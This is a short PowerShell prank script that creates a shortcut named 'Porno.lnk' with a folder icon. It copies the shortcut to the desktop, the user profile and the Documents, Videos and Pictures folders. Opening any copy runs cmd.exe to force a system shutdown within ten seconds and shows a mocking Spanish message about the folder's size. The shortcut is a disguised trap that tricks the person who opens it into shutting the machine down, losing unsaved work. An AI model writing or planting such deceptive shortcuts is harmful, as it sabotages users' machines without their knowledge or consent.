$WshShell = New-Object -comObject WScript.Shell
$DesktopPath = [Environment]::GetFolderPath("Desktop")
$Shortcut = $WshShell.CreateShortcut("$DesktopPath\Porno.lnk")
$Shortcut.TargetPath = '"C:\\Windows\\System32\\cmd.exe"'
$Shortcut.Arguments = '/k shutdown /S /T 10 /C "La carpeta del porno excede el tamaño aconsejado."'
$Shortcut.WorkingDirectory = '"C:\\"'
$Shortcut.IconLocation = "C:\WINDOWS\system32\imageres.dll, 3"
$Shortcut.Save()

#user
$outfolder=[Environment]::GetFolderPath("UserProfile")
copy-item $DesktopPath\Porno.lnk $outfolder\porno.lnk
#documents
$outfolder=[Environment]::GetFolderPath("MyDocuments")
copy-item $DesktopPath\Porno.lnk $outfolder\porno.lnk
#videos
$outfolder=[Environment]::GetFolderPath("MyVideos")
copy-item $DesktopPath\Porno.lnk $outfolder\porno.lnk
#images
$outfolder=[Environment]::GetFolderPath("MyPictures")
copy-item $DesktopPath\Porno.lnk $outfolder\porno.lnk